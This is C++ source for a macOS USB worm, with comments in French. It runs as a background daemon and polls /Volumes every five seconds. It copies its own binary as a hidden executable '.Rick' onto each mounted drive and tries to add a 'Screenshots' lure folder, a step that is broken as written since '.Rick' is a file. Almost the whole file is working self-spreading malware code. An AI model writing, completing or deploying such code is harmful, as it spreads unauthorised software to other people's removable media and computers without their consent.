// language: C++17, file: src/macos/05_usb_worm_mac.cpp, target: macOS, clang
// USB worm macOS - surveille /Volumes, copie cachee (.Rick, dot-prefix)
// Build: clang++ -O2 -std=c++17
// Note: autorun n'existe pas sur macOS - le drop attend la persistance
// cible (LaunchAgent) ou un geste utilisateur.
#include <mach-o/dyld.h>
#include <sys/stat.h>
#include <sys/param.h>
#include <dirent.h>
#include <unistd.h>
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>

static std::string SelfPath() {
    char buf[MAXPATHLEN];
    uint32_t sz = sizeof(buf);
    _NSGetExecutablePath(buf, &sz);
    return buf;
}

static void Infect(const std::string& vol) {
    std::string dest = vol + "/.Rick";
    struct stat st{};
    if (stat(dest.c_str(), &st) == 0) return; // deja infecte

    FILE* src = fopen(SelfPath().c_str(), "rb");
    if (!src) return;
    FILE* dst = fopen(dest.c_str(), "wb");
    if (!dst) { fclose(src); return; }
    char buf[65536];
    size_t n;
    while ((n = fread(buf, 1, sizeof(buf), src)) > 0) fwrite(buf, 1, n, dst);
    fclose(src);
    fclose(dst);
    chmod(dest.c_str(), 0755);

    // marqueur + attraction : dossier qui donne envie d'ouvrir
    std::string bait = vol + "/.Rick/Screenshots";
    mkdir(bait.c_str(), 0755);
}

int main() {
    daemon(0, 0);
    for (;;) {
        DIR* d = opendir("/Volumes");
        if (d) {
            dirent* e;
            while ((e = readdir(d))) {
                std::string name = e->d_name;
                if (name == "." || name == ".." || name == "Macintosh HD") continue;
                // saute les TimeMachine / volumes systeme
                if (name.find("Backups") != std::string::npos) continue;
                Infect("/Volumes/" + name);
            }
            closedir(d);
        }
        sleep(5);
    }
}
